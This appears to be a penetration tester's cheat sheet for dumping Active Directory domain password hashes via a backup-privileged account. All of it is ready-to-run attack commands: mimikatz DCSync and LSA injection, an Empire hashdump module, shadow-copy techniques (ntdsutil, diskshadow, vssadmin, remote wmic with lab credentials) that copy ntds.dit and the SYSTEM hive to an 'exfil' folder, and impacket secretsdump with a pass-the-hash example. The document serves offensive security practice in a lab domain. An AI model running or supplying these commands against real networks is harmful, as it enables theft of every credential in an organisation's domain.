#### Dumping domain passwords - svc_backup

Backup service account with permissions SeBackupPriviledge

##### mimkatz
```
lsadump::dcsync /domain:pentestlab.local /all /csv
lsadump::dcsync /domain:pentestlab.local /user:test
privilege::debug
lsadump::lsa /inject
```

##### Empire
```
usemodule credentials/mimikatz/dcsync_hashdump

```

##### Nishang
```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
```

##### powerspoloit
```
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 
```

##### Invoke-DCSync
```
Invoke-DCSync -PWDumpFormat
```

##### ntdsutil
```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

##### DiskShadow
```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset


diskshadow
LIST SHADOWS ALL

reg.exe save hklm\system c:\exfil\system.bak
```

##### wmic
```
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"

wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
```

##### vssadmin
```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

##### fgdump
```
fgdump.exe
```

##### impacket
```
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

##### NTDSDumpEx
```
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
```






